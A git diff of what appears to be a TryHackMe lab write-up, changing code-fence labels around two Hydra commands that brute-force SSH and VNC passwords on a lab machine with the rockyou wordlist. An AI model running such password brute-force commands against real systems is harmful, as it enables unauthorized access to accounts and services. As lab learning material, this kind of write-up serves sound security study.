@@ -17,7 +17,7 @@ Common attacks against passwords are presented below:
 
 Trying out `Hydra` example provided:
 
-```console
+```text
 ┌──(siachen㉿kali)-[~/CyberSec/THM]
 └─$ hydra -l alexander -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt 10.10.232.4 ssh
 Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
@@ -39,7 +39,7 @@ Used Hydra to brute-force VNC password.
 !!! note
     VNC does not require a user name.
 
-```console
+```text
 ┌──(siachen㉿kali)-[/dev/shm]
 └─$ hydra -P /usr/share/wordlists/rockyou.txt 10.10.232.4 vnc
 Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
